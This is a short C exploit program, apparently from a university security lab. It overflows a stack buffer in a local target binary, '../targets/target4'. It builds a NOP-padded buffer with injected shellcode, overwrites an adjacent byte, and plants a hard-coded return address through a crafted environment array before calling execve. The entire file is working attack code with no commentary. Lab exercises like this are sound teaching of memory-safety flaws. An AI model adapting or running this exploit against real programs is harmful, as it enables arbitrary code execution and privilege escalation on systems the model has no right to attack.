#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"
#define ADDR 0x3021fdf0
#define NOP 0x90
#define BUF_SIZE 189

int main(void) {
    char *args[3];
    char *env[7];
    char *ptr;

    char buff[BUF_SIZE];
    int i;
    ptr = buff;

    for (i = 0; i < BUF_SIZE; i++)
        buff[i] = NOP;
    for (i = 0; i < strlen(shellcode); i++)
        *(ptr++) = shellcode[i];

    buff[168] = '\x96';
    buff[169] = '\0';

    args[0] = TARGET;
    args[1] = buff;
    args[2] = NULL;

    env[0] = "\x00";
    env[1] = "\x00";
    env[2] = "\xa9";
    env[3] = "\x00";
    env[4] = "\x00";
    env[5] = "aaaaaaa";
    env[6] = "\xf0\xfd\x21\x30";

    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}
